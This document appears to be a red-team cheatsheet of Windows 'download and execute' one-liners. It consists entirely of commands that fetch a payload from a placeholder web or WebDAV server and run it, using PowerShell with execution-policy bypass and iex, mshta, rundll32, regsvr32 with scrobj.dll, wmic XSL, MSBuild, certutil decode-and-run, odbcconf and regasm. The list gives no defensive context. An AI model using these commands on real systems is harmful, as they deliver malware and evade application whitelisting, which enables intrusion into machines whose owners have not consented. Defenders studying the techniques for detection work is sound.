# download-and-execute
- Windows download and execute remote payload oneliner cheatsheet

## Powershell
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

powershell -exec bypass -f \\webdavserver\folder\payload.ps1

## CMD
cmd.exe /k < \\webdavserver\folder\batchfile.txt

## Cscript
cscript //E:jscript \\webdavserver\folder\payload.txt

## Mshta
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))

mshta http://webserver/payload.hta

mshta \\webdavserver\folder\payload.hta


## Rundll32
rundll32 \\webdavserver\folder\payload.dll,entrypoint

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();


## WMIC
wmic os get /format:"https://webserver/payload.xsl"

## Regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll

## Regsvr32
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll

regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll

## odbcconf
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}

## MSBuild
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"

## Certutil
certutil -urlcache -split -f http://webserver/payload payload

certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll

certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
